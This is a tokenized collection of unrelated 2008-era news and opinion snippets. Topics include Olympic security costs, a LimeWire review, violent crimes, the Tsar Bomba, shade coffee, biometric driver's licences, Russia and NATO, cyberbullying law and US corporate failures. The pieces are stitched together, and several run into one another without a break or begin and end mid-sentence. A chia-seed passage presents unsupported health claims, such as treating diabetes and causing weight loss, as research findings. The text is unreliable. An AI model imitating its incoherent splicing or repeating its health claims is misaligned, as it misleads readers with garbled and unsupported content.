The Greek government said it paid $ 1.5 billion on security at the much larger 2004 Summer Olympics in Athens .
The B.C. government is on the hook for half the security costs for the venues and the athletes in 2010 .
The way things are going , we probably wo n't know how much this will cost until after the 2009 election .
The secrecy over the security costs makes a mockery of Premier Gordon Campbell 's claims in 2003 that the Games belong to the people of B.C. -- not to mention his outlandish 2001 claim that the B.C. Liberals would provide the most open and accountable government in Canada .
File sharing does n't have to be about indiscriminate trading with anonymous strangers .
LimeWire served up a major upgrade to its file sharing client Wednesday with a simpler interface and powerful private sharing features .
Using the new version , you could potentially share music with your friends , download NSFW videos from wherever and share photos with your family — all without anyone being the wiser .
This may sound risky , but
LimeWire 's new sharing features allow a level of control over what you 're sharing with whom that makes it a feasible scenario .
You can still use it just like the old version , to share and download from strangers , but the socially networked sharing feature could become the main way many people use the program .
The alpha version of LimeWire was made public for Windows , Mac and Linux on Wednesday at around noon .
The program installs easily , importing files from your library and letting you search and download music , video , images , documents and other files from the gnutella P2P network .
It can also act as your bit torrent client .
But the main improvement here is the way it lets you set up easy , private file sharing networks on a file - by - file , user - by - user basis .
" I have a
65 - year - old mother in Scotland , and the idea of asking her to sign up with Snapfish and to log in , and the upload process , it 's still a very complicated thing for ordinary people , " said LimeWire COO Kevin Bradshaw when he first told us of the plan .
" Imagine a situation where she would have an installation of LimeWire ... I could just drop pictures into a folder on my hard drive and they would automatically appear on her drive . "
Indeed , the free private sharing feature ( instructions below ) is the strongest selling point of the new LimeWire .
But you can also use it as before to download stuff from strangers and share content with the gnutella network at large .
But in it 's default mode , LimeWire is only set to share files you downloaded from the network ; all other content in the library must be intentionally shared , either with specific users or the network in general .
Here 's how it works .
The first thing you 'll notice after you upgrade is the new , super clean interface .
If you can't figure out how to search for files with this interface , you might want to get yourself checked .
Note : some of these screenshots are of the private alpha version .
The search results start rolling in .
As with the previous version , each search query spawns a new tab :
Double - clicking on a search result brings up the download screen .
LimeWire can automatically import all downloaded music into your iTunes library :
[ ](/images_blogs/photos/uncategorized/2008/12/10/downloading.jpg)
Now we get to this new private sharing feature .
After you enter your Gmail user name and password ( or other Jabber log - in ) , your friends show up in a list to the left .
LimeWire product manager said they 're working to add the ability to import friends from Facebook and other sites .
Friends who are online appear in a chat window so you can ask them to download and install it .
Once they do , you 'll be able to decide which files to share with them and view the files they 're sharing with you .
Names of friends have been obscured ( in other examples , we cropped them out ) :
Again , in LimeWire 's default setting , only files downloaded from LimeWire are shared , as opposed to most other file sharing clients , which share everything in your library by default .
However , you can activate network - wide sharing for files by clicking the Share link next to each one or by right - clicking multiple files .
Note that files can be unshared at any time :
The other way to share files in the new LimeWire is to choose a specific person in your friend list and then designate files or entire file types to be shared with them .
You can do this for music , videos , images , documents , programs and other file types :
LimeWire product manager Nathan Lovejoy told us that the company intentionally left out a way to add friends from the community at large to your friend list , as one could with the original Napster ( although you can download whatever they 're sharing publicly ) .
That way , he said , people really have to know those they 're sharing with .
Not only does this discourage RIAA snoops , but it should also result in a more personal experience when using the software , because people will actually have to know their friends .
What a concept !
In addition to file - by - file private sharing , the other main way to share files with a friend is to share all of a certain type of media — audio , video , documents and / or images .
To do this , you select the media type in your library and then hit the share button .
In this case , I 'm going to share all of my audio files with a specific friend .
This feature could work great for sharing all your photos with family , while keeping your music and videos to yourself :
Then you enter the friend 's name :
Click on any of your friends to see what they 're sharing with you , categorized by file type :
The LimeWire music store is available within the application , so you can purchase MP3s for $ 1 a piece , or cheaper if you buy in bulk :
The LimeWire alpha version is already relatively stable , and already offers a solid way for users to move beyond vanilla file sharing towards a personalized social media network for friends and family .
Whenever you share files on a file sharing network ( with a few exceptions ) , you expose your IP address to other users of the network , which is how the RIAA picks people to sue .
LimeWire 's simple - to - use private sharing features will help file sharers avoid legal scrutiny , but they also represent a substantial , non-infringing use for the program that will be of great benefit to users .
And you can forget about the file size limitations of e-mail , online file - sending services and the like .
LimeWire lets you share files of any size for free , because it transfers content directly from computer to computer .
You can download the new LimeWire as of Wednesday .
Lovejoy tells us that the beta version should be ready in a couple of weeks .

The incident , which happened in the Ohio town of Springfield , has left the woman in a critical condition .
According to news website wlwt.com , Timothy Haven 's pistol went off during sex , shooting estranged wife Carolyn Havens , 42 , in the upper chest .
Mrs Havens , 42 , is being treated at nearby Miami Valley Hospital in Dayton , the website reports .
Court documents show Mr Havens , 38 , had previously served 60 days in jail for assaulting his wife .
He was ordered to undergo anger management classes .
Despite the incident allegedly happening during sex , Mr Havens was arrested for violating a civil protection order that his wife had taken out against him earlier in the year .
Bond was set at $ 75,000 after prosecutors asked for a high bond , " due to alleged prohibited contact between the parties ( and ) the suspicious nature of the circumstances surrounding ( her injury ) . "
The shooting comes days after NFL star player Plaxico Burress accidentally shot himself in the thigh in a Manhattan nightclub .

A Summer Not Dominated By Superhero Movies
Sure , there 's Watchmen in March , but that already feels like something from the past ; superhero movies were so 2008 .
2009 , by contrast is The Year Of Reliving Someone Else 's Childhood , with new Transformers , new Star Trek , new Terminator and GI Joe ( Not to mention new Witch Mountain ) .
I 'm ignoring Wolverine by way of leading by example , because you should all do the same thing .

Genre Directors Pushing Themselves Again
Maybe it 's just my cynical eye , but with the exception of the Wachowskis and Speed Racer ( and , arguably , Chris Nolan and Dark Knight ) , 2008 seemed pretty light on big name directors trying to dazzle us .
Thankfully , 2009 offers at least two movies to fill that void .
James Cameron's 3D Avatar may have the most eyes on it right now - if only because he has n't made a movie since 1997's Titanic - but I 'm much more excited about Terry Gilliam 's The Imaginarium Of Doctor Parnassus , which sees him try to reclaim the scope and grandeur of Time Bandits and Brazil .
You know that , even if he fails , it 'll probably be the most interesting movie of the year .

__1961 : __The Soviet Union detonates the largest nuclear or thermonuclear weapon ever constructed .
The Tsar Bomba ( as it was known in the West ; the Soviets referred to it as Big Ivan or , more officially , RDS - 220 ) was a three - stage hydrogen device with a 100 - megaton capacity .
Andrei Sakharov , who later suffered a crisis of conscience and became a celebrated Soviet anti-nuclear dissident , was the project leader and senior weapons designer .
Soviet Premier Nikita Khrushchev ordered the building of the bomb during a meeting with Sakharov in July 1961 .
To say it was completed quickly is to say the least :
The elapsed time from conception to detonation was a mere 16 weeks .
The bomb weighed 27 tons and was so big that the largest Soviet bomber , a Tu - 95 " Bear , " had to be heavily modified to accommodate both its girth and its weight .
The Tsar Bomba was built for midair detonation .
An elaborate , five - stage parachute system was designed , with a main canopy area of 5,400 square feet to slow the bomb 's descent , so the plane had time to clear the area .
That was accomplished with relative ease , but other design problems arose as the bomb neared completion .
This might have caused a delay in testing if Sakharov had n't overruled the skeptics while ramming through a few late modifications .
The bomb was dropped at around 11:30 a.m.
Moscow time from an altitude of 6 miles above the Mityushikha Bay test range on the Arctic Sea island of Novaya Zemlya .
It detonated in three stages at an altitude of 2.5 miles .
The explosion resulted in a cloud that boiled 210,000 feet ( 40 miles ) into the sky .
Its force obliterated every building in the deserted village of Severny , 34 miles from ground zero , and damaged structures more than 600 miles away .
Had the Tsar Bomba been detonated with its full 100 - megaton force , the resulting fallout would have totaled 25 percent of all fallout emitted since Hiroshima .
Although the actual yield has been disputed over the years , the number usually assigned is 50 megatons of TNT ( more than 3,300 Hiroshima - size bombs ) .
Even at half its capacity , the bomb resulted in by far the largest man-made explosion ever .
Its flash was visible from 600 miles away .
According to one witness who visited ground zero in the aftermath : " The ground surface of the island has been leveled , swept and licked so that it looks like a skating rink .
The same goes for rocks .
The snow has melted and their sides and edges are shiny .
There is not a trace of unevenness in the ground ....
Everything in this area has been swept clean , scoured , melted and blown away . "
For his role in the test , bomber pilot and mission commander Maj .
Andrei E. Durnovtsev was promoted to lieutenant colonel and made a Hero of the Soviet Union .
The bomb came along at a time of tense relations between the United States and the USSR .
Nearly two years had passed since Khrushchev 's speech declaring the Soviet Union 's support for wars of national liberation , only six months since the U.S. fiasco at the Bay of Pigs , and barely two months since the construction of the Berlin Wall .
The two countries were actually involved in nuclear - test - ban negotiations , and the timing of the test was seen largely as a measure of Khrushchev 's dissatisfaction with the way things were going .
In reality , the Tsar Bomba was impractical , more effective as a propaganda weapon than anything else .
The bomb was too large to be delivered by an ICBM , meaning it could only be delivered by strategic bomber .
The only three American metropolitan areas sprawling enough to warrant being targeted by such a weapon ( New York , Chicago and Los Angeles ) required at least eight hours of flying time over enemy airspace and were therefore unreachable , owing to U.S. air defenses .
Still , the bomb was an excellent example of the Russian penchant for gigantism .
Even the western nickname itself , Tsar Bomba , or " King of the Bombs , " was inspired by other Russian behemoths : Tsar Kolokol , the world 's largest bell , and Tsar Pushka , the world 's largest cannon , both on display at the Kremlin .
Two Tsar Bombas were built .
The one they did n't drop , a dummy , remains on display at the Russian Atomic Museum in Arzamas - 16 ( now Sarov ) , the formerly secret city where the bomb was built .

Bruce Pardo Dressed As Santa Kills 9 People ( Photos )
, 45 , recently divorced and without a job , arrived on the doorstep of his ex-wife 's parents at 11:30 p.m. on Christmas
Eve with a large present in one hand and a semi automatic handgun in the other .
When a young 8 year old girl opened the door , he shot her in the face and opened fire on the two dozen people inside the Covina , California home , killing eight and wounding two .
The home on a quiet Knollcrest Drive cul - de-sac some 22 miles from L.A. , was then torched by Pardo .
The former engineer who had worked in the aerospace industry , had gift wrapped a 2 - 1 / 2 foot high pressurized tank that had been converted into a homemade flame thrower .
He used it to propel a highly flammable liquid throughout the home before he fled the scene .
According to Captain Mike Brown , it took 80 firefighters several hours to bring the 40 to 50 foot high flames under control .
Nine bodies have been recovered in the smoldering carnage .
Among the missing and presumed to have died are Pardo 's ex-wife and her parents 80 year old Joseph Ortega and 70 year old Alicia Ortega .
Several of the party - goers were able to escape through a backdoor and rushed to neighboring homes .
Among those were an 8 year old girl and a 16 year old girl , who were taken to area hospitals with gunshot wounds .
Both are expected to recover .
Police received a call at 3:30 a.m. from Pardo 's brother who summoned them to his home in Sylmar , 25 miles away from the scene of the crime .
When they arrived they found Bruce Pardo dead from a self inflicted single gun shot to his head .
Police later discovered that he had booby trapped his car with a pipebomb - which later exploded .
A bomb squad reports that no one was injured in that surprise twist .
Bruce Pardo had lived in Montrose with his wife and her three children until they separated in the spring of 2008 after a marriage that lasted one year .
Their divorce was filed in September and the settlement was reached last week .
Pardo , as in the past , had volunteered to serve as an usher at midnight mass on Christmas Eve but he never made it to Holy Redeemer Catholic Church .
Jan Detanna , head usher at Holy Redeemer said , " I 'm just -- this is shocking .
He was the nicest guy you can imagine .
Always a pleasure to talk to , always a big smile . "
During a news conference this morning , police indicate Pardo was carrying $ 17,000 in cash and had a plane ticket from Los Angeles to Canada .
Police believe that he altered his getaway plan because he was suffering from third degree burns to his body .
He broke into his brothers home and killed himself instead .

Here 's one more reason to say " shade grown , please " when you order your morning cup of coffee .
Shade coffee farms , which grow coffee under a canopy of multiple tree species , not only harbor native birds , bats and other beneficial creatures , but also maintain genetic diversity of native tree species and can act as focal points for tropical forest regeneration .
The finding comes from a study published by University of Michigan researchers Shalene Jha and Christopher Dick in the Dec. 23 issue of the journal Current Biology .
Jha , a graduate student whose main interest is insects , initially wanted to find out whether shade coffee farms nurture native pollinators such as stingless bees .
When she began her fieldwork in Chiapas , Mexico , she focused on a particular tree , Miconia affinis , which is pollinated by an unusual method known as buzz pollination .
In order to release pollen from its flowers , bees grab hold and vibrate their flight muscles , shaking the pollen free .
Non-native species such as Africanized honeybees do n't perform buzz pollination , but native bees do , said Jha , " so I thought Miconia , which requires buzz pollination and is common both in forests and on coffee farms , could be a bio-indicator of how well native bees are pollinating native plants . "
As she spent time in the field , however , Jha realized that the story of how Miconia trees spread into coffee farms and how their dispersal affects the tree population 's genetic diversity begged to be addressed before she proceeded with the pollen studies .
With guidance from Dick , an assistant professor of ecology and evolutionary biology who studies genetic diversity patterns in tropical tree species , Jha collected and analyzed DNA samples from Miconia trees growing in a network of coffee farms and forest fragments .
Typical of many coffee farms in the area , the three farms in the study were clear - cut and burned in the late 1930s and immediately replanted with coffee bushes and canopy tree species , including nitrogen - fixing legumes and fruit trees .
Since then , farmers have allowed understory trees such as Miconia to invade because they help prevent soil erosion .
The trees spread into the farms when birds and bats carry their seeds from " mother trees . "
By performing a genetic analysis , Jha and Dick were able to determine whether trees growing near one another were all siblings from the same mother tree or a genetically diverse assortment from multiple mothers .
" We found that clustered trees in the forest were highly related to one another , suggesting that the seeds are not moving far from the mother trees , " said Jha .
" In the coffee farms , however , even in close clusters , the trees were very distinct from one another genetically , indicating that the seeds came from multiple mothers . "
The difference likely occurs because small , forest - dwelling birds like the chestnut - sided warbler are the main seed carriers in forested areas , while large , ubiquitous birds like the clay - colored thrush spread seeds throughout coffee farms .
A concern in agricultural areas is that increasingly fragmented landscapes isolate native plant populations , eventually leading to lower genetic diversity .
But this study shows that shade coffee farms , by being hospitable to birds , support widespread dispersal of native trees , in effect connecting patches of surrounding forest .
In addition , shade coffee farms may serve as reservoirs for future forest regeneration , as the farms typically fall out of production in less than a century .
Given that potential --- as well as their roles in connecting habitat patches , preserving genetic diversity and sheltering native wildlife --- it is important to encourage this traditional style of agriculture , Jha said .
In spite of the trendiness of shade coffee , the enormous demand for java is pressuring some farmers into converting their traditional farms to intensive , industrialized plantations .
" A lot of the rustic coffee farms are turning into sun-intensive operations , where farmers cut down the overstory and try to level out the fields so it 's easier to get machines in , " said Jha .
" It 's more essential than ever to pay attention to the ecological benefits shade coffee farms provide . "
Jha and Dick received funding for the project from the University of Michigan and the National Science Foundation .

Privacy advocates across Canada have been struggling to prevent the Ontario provincial government from passing legislation that will see radio identifiers and biometric data inserted into future Ontarian drivers licenses .
In spite of their efforts to raise the government ’s awareness of the privacy dangers accompanying the proposed licenses , it appears as though their work may been in vain : Bill 85 is now in its final reading , and is widely expected to be passed on November 17th , or shortly thereafter , when the reading continues .
Ontario , and the rest of Canada , is being forced into including radio and biometric features in future drivers licenses by the United States government .
As a consequence of the U.S. Western Hemisphere Travel Initiative ( WHTI ) , all Canadians and Americans who cross into the U.S. at a land border with just a driver license will be required to present an Enhanced Drivers License ( EDL ) as of June 1 , 2009 .
While the radio ‘ feature ’ is disturbing in its own right , insofar as it emits a unique identifier whenever brought into range of a reader , I want to focus on the biometric features of these cards , why they raise human rights and civil liberties concerns , and the risk of function creep associated with the biometric facets of EDLs .
WHTI - Mandated Biometrics
The EDLs that Canadians and Americans will need to enter the U.S. include a picture of a driver ’s face that can be analyzed against an American - Canadian facial database .
To enroll in the database , individuals must first have their images captured , after which the computer system converts the image to a biometric template that is stored in a shared American - Canadian database .
Next , the biometric template is used to authenticate a person ’s identity , ensuring that the biometric data that is provided recalls the precise template for the individual in question .
Finally , and arguably the most concerning , the system performs an identification process , where the biometric data is compared to all of the records held in the database .
This final stage allows for mass analysis of images in the database against incomplete facial templates , such as those derived from security cameras .
The WHTI - mandated biometrics are intended to guarantee the identity of individuals at the border while providing an extra level of difficulty in creating illegal identity documents .
In theory , because these licenses crosscheck between the image provided , and the one entered into the government database , it is less likely that phony IDs can be used to cross the Canadian - American border .
Beyond this security feature , the American and Canadian governments argue that placing these biometrics in identity documents will enable airports to process travelers more efficiently because of the redundancy in evaluating a person ’s identity .
The WHTI mandates are publicly stated as securing America while providing convenience to Americans and Canadians alike .
Current Issues with the Proposed Biometrics
Several issues arise when citizens provide their biometric information to central government agencies .
To begin , there is the matter that biometric authentication relies on a statistical pattern recognition technology .
We do not live in Jack Bauer ’s nightmare world of 24 , where computers accurately and easily identify faces against government databases ; in the real world there is a likelihood that images will be misidentified .
Such misidentifications can lead to an inability to move internationally , and given the ‘ ease ’ of removing oneself from the American and Canadian ‘ no - fly ’ lists it is likely that any immobility imposed by mistaken biometric associations will be long - term conditions .
Inviting the possibility of such immobility is an affront to Canada ’s commitment to the Universal Declaration of Human Rights , which mandates that “ Everyone has the right to leave any country , including his own , and to return to his country ” — the biometrics , as proposed , may deny Americans who have come to visit Canada from reentering their own nation , or prevent Canadians from enjoying their right of international movement .
Regardless of America ’s hesitance to sign the Declaration , Canada and her governments should attend to their obligations and resist the licensing changes on behalf of both Americans and Canadians .
In addition , there are concerns that the biometric proposals would fly in the face of privacy protections offered by Ontario ’s Privacy and Information Commissioner , Dr. Ann Cavoukian .
In her open letter to the Hon. D. Tsubouchi on April 5 , 2001 she warned that , “ … there must be no ability to compare biometric images from one data with biometric images from other databases or reproductions of the biometric not obtained from the individual . ”
Her caution was offered during a time that the Ontario government was considering issuing smart cards , and it still echoes today : people must be aware of all uses of their biometric data and consent to its use .
In the case of Ontario , the government has been silent on the possibility of American authorities using the biometric information provided by the drivers license database for purposes beyond border screenings .
Finally , we live in a world where identity theft is becoming more sophisticated , more harmful , and more common .
Were a person to successfully enroll in the biometric - program associated with the drivers license using another person ’s identity , then the thief would have effectively stolen another person ’s face for the purposes of computer - algorithm authentication .
In a situation like this , how do we adjudicate when the correct person uses a license ?
The danger of ‘ losing ’ biometric information places innocent citizen at substantial risk of being accused of actions they are not responsible for .
Research groups have demonstrated that there are substantial costs that follow from having one ’s identity stolen , with costs reaching as high as thousands of dollars .
How much will these costs skyrocket when biometric data is included in the information that thieves steal ?
Function Creep
In the case of the American - mandated drivers licenses , there is a considerable worry of function creep that could ensue after they are distributed to the public .
Interpol has recently announced that they want to begin using a facial recognition database to catch suspects by using a facial recognition system at borders , and various law enforcement agencies in Canada and the United States have similarly expressed an interest in this mode of discovering and identifying suspects .
Imagine how much safer society might be ; by using a massive government - sponsored facial database it would be far easier to identify dangerous elements in society !
While this might , initially , sound like a positive thing there are ( at least ) two associated dangers with this kind of function creep .
First , any such use of the biometric data for these purposes would exceed the intent that the data was collected for — citizens should always be notified , and be required to give their consent , when their biometric data might be used for either private or public purposes .
Second , and perhaps of even greater concern , biometric analyses are not wholly accurate .
Accuracy rates plummet when less than ideal images are used in facial comparisons — the images taken from a security camera , for example , provide poor templates to search against the database .
Searching the drivers license database with poor templates would risk implicating a great number of people as ‘ suspects ’ in a crime , based on poorly constructed computer - algorithms .
The prospect of being a suspect on the basis of a computer foul - up is a less than heartening thought to the innocent .
Voltaire famously wrote , “ It is better to risk saving a guilty man than condemn an innocent one . ”
We should heed his sound advice , and rethink the deployment of identity cards that will almost inevitably condemn the innocent to hardships in our governments ’ incessant drives to ‘ secure ’ the societies that they govern from the guilty .
( OrganicJar ) Chia seeds are an ancient superfood that ’s making a big comeback and for good reasons .
These little black and white seeds are one of the most powerful , functional and nutritious superfoods in the world !
Chia seed are an excellent source of fiber , packed with antioxidants , full of protein , loaded with vitamins , minerals , and the richest known plant source of omega - 3.- more Omega - 3 than salmon - more protein , fiber and calcium than flax seeds - contains all essential amino acids - twice the amount of potassium in a banana - twice the protein of any other seed or grain - three times the antioxidants of organic blueberries - three times more iron than spinach - five times the calcium of milk - fifteen times more magnesium than broccoli Chia seeds absorb more than nine times their weight in water and form a gel that causes a slow release of carbohydrates and an equally slow conversion of carbohydrates into glucose for energy .
Research shows that chia improves diabetes , lowers cholesterol , induces weight loss and increases your strength , endurance and energy levels .
There are unlimited ways to incorporate Chia Seeds into your diet .
Just remember you can substitute chia seeds in any recipe that calls for flax seeds .
I ’ve been eating chia seeds for a while now and love them .
They ’re very easy to incorporate into your diet .
The fastest and easiest way to eat chia seeds is to add it to the water you drink everyday .
I add one tablespoon of chia seeds into an eight - ounce glass of water or juice , make sure to stir and break up any lumps , let it sit for about five minutes and drink .
You can also make a ‘ Chia Gel ’ by adding 1/3 cup of chia seeds to 2 cups of water .
Make sure to stir the mixture to avoid clumps and in about 10 minutes it ’s done .
There are tons of ways to use chia seeds .
You can add them to cereal , yogurt , salads , soups , granola , oatmeal , smoothies … the list goes on forever .
Would love to hear recipes anyone has and where online you buy your Chia Seeds .

Upon Barack Obama ’s election , the Russians made threats to US allies over their acceptance of a US missile defense system .
Also , Russia recently sent its first large military force to Latin America since the end of the Cold War to participate in naval exercises off the Venezuelan coast .
Is this a flagrant test of a new and inexperienced president , much as Nikita Khrushchev tested the neophyte John F. Kennedy when he first took office in 1961 ?
More likely , Russian behavior is merely putting the new president on notice that Russia is stronger now and cannot be kicked around anymore  as it was during the Clinton and George W. Bush administrations .
Meanwhile , the lame duck Bush crowd is still polishing its boots to take another whack .
Despite investigations by human rights groups indicating that Georgia started the recent Russian - Georgian war and parliamentary testimony by Erosi Kitsmarishvili , a former Georgian ambassador to Moscow and confidant of Georgian President Mikheil Saakashvili , that Georgia initiated the conflict , the Bush administration had the chutzpah to demand that its NATO allies admit Georgia and the Ukraine into the alliance without meeting the usual requirements of defense reform and improved military capabilities .
The main reason that Georgia started the war by attacking the breakaway region of South Ossetia , according to Kitsmarishvili , was that Saakashvili thought he had US backing for this aggressive tack .
If given a NATO security shield , the belligerent Saakashvili might become even more reckless and involve the United States in a confrontation with a nuclear - armed power .
The Russian - Georgian war , however , should have made both Ukraine and Georgia leery of depending entirely on a faraway nation for security , given the reality of Russia ’s local conventional military superiority and nuclear deterrent .
Ultimately , if it came down to sacrificing US cities in a nuclear war with Russia to save these two non-strategic countries , the United States would most assuredly balk .
The Ukrainian public has apparently faced this reality  souring on NATO membership  and the tottering Ukrainian government can hardly push through Ukraine ’s entry into the alliance even if the United States manages to bludgeon the reluctant Germany , Italy , France , Spain and other NATO allies to agree to admit both nations .
When Russia was weaker , in the 1990s and during the current decade , the US pushed the potentially hostile NATO alliance up to Russia ’s borders , established bases in the former Soviet states of Central Asia to contain Russia and China , detached Kosovo from Russia ’s Serbian ally , and rerouted energy pipelines around Russian territory .
These aggressive actions in Russia ’s sphere of influence humiliated Russia and have led to " in - your - hemisphere " Russian naval exercises with Venezuela and threats against US allies that will host US missile defenses on their territories .
Some US media outlets have claimed that Russia is beginning to behave as if the Cold War were still afoot .
These sources are blind to the fact that in US policy circles , the Cold War mentality was never abandoned .
After promising Soviet leader Mikhail Gorbachev that if Germany were reunited within NATO , the alliance would not expand , the United States then broke this promise and attempted to grab all the territory in Europe that it could before the Russian bear once again became strong .
That has not happened and the humiliated and angry Russian public is pressing Russia ’s leaders to take a strong position vis-à - vis the United States .
Threats against allies accepting missile defense hardware and naval exercises in the US sphere of influence are Russia ’s way of signaling that further NATO expansion to include Russia ’s key neighbors will meet stiff resistance .
The up - to - now oblivious US government needs to finally heed these warnings .
More important , the incoming Obama administration and the US public should ponder whether they want to ultimately hold their cities hostage to nuclear holocaust to preserve the territorial integrity of these two faraway and non-strategic states .
The answer should be an emphatic " no . "
More on Copyright Enforcement and Surveillance
TLF reader Timon makes a really good point about the choice between authenticated and unauthenticated networks :
Lawyers are trained to view complex questions and come up with balanced approaches to them — ie “ balancing ” privacy with police prerogatives and subpoenas .
The technical world is rather the opposite ; no matter how complex , an encryption algorithm , for example , either is or is not secure , and as soon as it is n’t it really is n’t .
In a legal class it makes for good discussion to say , on the one hand , IP addresses should be private , except when they are used to commit a crime .
In direct technical terms what this amounts to is a full surveillance state that is then ruled by court procedure : the law requires someone keep records of all mail or other communications , and then provide them to the authorities when told to .
While under law there could be a protection of privacy , in technical terms there is absolutely no privacy , except that which the state decides to concede , the information it declines to look at but which is permanently stored on its orders and available for its inspection .
It may seem to you that some people are just unwilling to split the difference and be reasonable , but it really is the case that where lawyers see gray others see black and white , with good technical reasons .
There is no way to enforce copyright , for example , and allow anonymous speech online , as you seem to be picking up on .
That is not because we are unwilling to be fair , it is a characteristic of information .
Demanding that government limit itself is never a very effective strategy , because if government can do something , it probably will .
It ’s far more effective to limit government by design .
The Internet ’s open architecture is , among other things , an important limitation on the government ’s surveillance power .
Precisely because there are so many ways to get on the Internet without authentication , the government has to do a lot of extra work if it wants to spy on people .
For those of us who care about civil liberties , this is a feature , not a bug .
Of course , freedom is n’t free .
The same characteristics that make the Internet resistant to a surveillance state also make it harder to enforce copyright , laws against child pornography , etc .
This is unfortunate , but I do n’t think it ’s so unfortunate that we should be willing to toss out the liberty - enhancing benefits of the open Internet .
Because as Timon says , there is n’t a middle ground here .
Either ISPs have a reliable way to identify their users or they do n’t .
And if we require them to have this ability for what we regard as good reasons , it ’s inevitable that the government will use that same power for bad purposes down the road .
Prosecutors in Missouri have been filing a flurry of charges under a new anti-cyberharassment statute that was passed as a result of the landmark Lori Drew / MySpace cyberbullying case .
The law went into effect in late August and was passed after 13 - year - old Megan Meier hanged herself in Missouri in 2006 following online harassment through a MySpace account .
When a press report in 2007 revealed the role that 47 - year - old Lori Drew played in Meier 's harassment , local authorities felt pressured to charge Drew with a crime , but could find no law under which to prosecute her .
So Missouri lawmakers drafted legislation to outlaw future threats or harassing communication that causes emotional distress .
Under the law , perpetrators can be charged with a misdemeanor or felony .
In the three months since the law took effect , Missouri authorities have wasted little time in bringing charges against seven people , according to the St. Louis Post - Dispatch .
A 21 - year - old woman named Nicole Williams was charged for allegedly sending harassing text messages to a 16 - year - old girl and allowing others to use her cellphone to leave vulgar voicemail messages for the victim threatening her with rape , among other things .
Williams allegedly targeted the teen over a jealous dispute involving a boy , according to the Post - Dispatch .
Two St. Louis men were charged separately with sending harassing text messages to their ex-girlfriends .
A man protesting the development of a proposed resort was charged with sending a threatening e-mail to city hall staff .
A 28 - year - old woman was accused of sending harassing text messages to her ex-husband 's girlfriend .
A 19 - year - old man was charged with sending 17 threatening text messages to his mother 's husband .
A 17 - year - old involved with a classmate in a dispute over a girl is accused of sending the classmate death threats via text messages .
Nicole Williams ' attorney says the law was poorly written and hastily passed in an effort to appease the public 's anger over Drew 's involvement in Meier 's death .
Megan Meier was lured into an online MySpace relationship by a 16 - year - old boy named " Josh Evans " who rejected her a month later , telling Meier the world would be better place without her .
Authorities later learned that Drew , along with her 13 - year - old daughter and an 18 - year - old family friend and employee , created the fake " Josh Evans " MySpace account to lure Meier into a relationship and determine if Meier was spreading rumors about Drew 's daughter .
Meier , who had a history of depression and emotional instability , hanged herself in her bedroom after being attacked by " Josh . "
After Missouri authorities concluded they could not charge Drew with any crime , federal prosecutors in Los Angeles decided to use a federal anti-hacking statute , the Computer Fraud and Abuse Act , to charge Drew with three felony counts of unauthorized access to MySpace 's computers and one felony conspiracy count .
Drew was acquitted of the three felony counts for unauthorized access but was convicted on three lesser misdemeanor charges of unauthorized access .
A jury deadlocked on the fourth charge of conspiracy .
Prosecutors have been criticized for using the CFAA to prosecute Drew .
The case is likely to be appealed , at which point experts expect the verdict to be overturned .
At least 18 states currently have laws addressing cyberbullying and harassment .

Before Congress dispenses any funds , loans , or loan guarantees to major American industries it should insist on wholesale replacement of the executive management teams of every corporation taxpayers assist .
This is not radical or scorched - earth thinking ; it is routine practice whenever corporations merge that top operatives , with few exceptions , are replaced by hand - picked new appointees .
Should Congress do anything less ?
Here 's why this makes sense .
The health of corporate management in the U.S.A. has been dismal for decades .
What we are now witnessing is the predictable end - stage in the natural history of this disease .
One wonders if Congress ( which has shown it can't even manage a $ 700 billion bail - out fund ) could ever really comprehend that sending cash to CEOs in commercial banking , investment banking , airlines , automakers , credit - card companies , or raw material producers will result in predictable repetition of the dismal patterns we have seen in recent decades .
For truly , the leadership selection process among corporate boards and human resources management in the U.S. has been demonstrably incompetent since the 1950s .
Recent U.S. history is replete with examples of colossal failures by corporate boards and their CEOs .
Here are some of the most egregious failures of American corporate management :
1. The Steel Industry ( R.I.P. -- 1970s )
Steel industry executives were so completely out - maneuvered by United Steel Workers ( USW ) negotiators that by the 1960s some U.S. steel companies were staffing their foundries and blast furnaces while paying the most senior steelworkers up to 26 weeks of vacation per year !
The earliest signs of a failing U.S. corporate managerial class were visible in the steel industry by the late 1950s and early 1960s .
David J. McDonald , who became president of the USW upon the death of Phillip Murray in 1952 , boldly challenged industry giants Bethlehem Steel , U.S. Steel , Republic Steel and other large corporations in his quest to gain better wages , job security , and employer - paid pensions .
Imagine leading a large international steel corporation , hobnobbing with Presidents , golfing with Senators , drawing big bucks for an annual salary and bonus -- and all the while failing to recognize that no company can reasonably operate at a profit over the long term if even a small portion of its workers must be replaced , while on vacation , 26 weeks of each year .
No small business owner would contemplate offering a half - year 's vacation benefits to even the most valued of employees , but that is exactly what happened in the steel industry .
2. The Auto Industry ( R.I.P -- 2009 ? )
The Big Three CEOs - Richard Wagoner of General Motors , Robert Nardelli of Chrysler and Alan Mulally of Ford , and their predecessors , are really clones of the worst bosses from a Dilbert cartoon .
The prima facie evidence for Big 3 Auto 's management 's ineptness is the current cash crisis , with GM now claiming ( 12/02/08 ) that it will run out of cash within 6 weeks .
Every competent manager knows that sufficient cash must always be conserved ; good managers are always forecasting cash flow days , weeks , months & years in advance .
Did GM fail to comprehend , 2 or 3 years ago , this nation 's increasing debt , dubious banking behaviors , and stagnant income trends ?
There is also ample historic evidence of corporate management 's ineptitude demonstrated ( then , as now ) by U.S. auto industry " leaders " - .
In the 1960s , as Chevrolet introduced its Corvair , a Time Magazine article quoting a senior GM executive who asserted arrogantly that small cars like the Corvair were simply a passing fad .
He said in effect that , " We know that American buyers really want big cars .
These compacts wo n't be around for long . " -
Even a naíf could see at the time that this business blindness did not bode well for the U.S. auto industry .
This author 's automobile history is one example of a reasonable buyer 's response to management failure .
After a 2 - month fling with a U.S. - made Studebaker that developed a hole in a cylinder wall , this writer has now progressed through two 125,000 + mile Volkswagens -- one beetle , one bus ; an MGB - GT ; two Toyotas ( both still running well at 200,000 miles when sold ) ; a Mazda Rx - 7 ; and two Volvos ( each well over 250,000 miles when sold ) .
And guess what this author 's 20 - ish sons drive ?
One has chosen Lexus , the other Volkswagen .
Why would they buy a U.S. - made product that is " value " -- engineered to fail and designed to invite replacement every 80,000 - 90,000 miles ?
Do GM , Ford & Chrysler really think the American public is that stupid ?
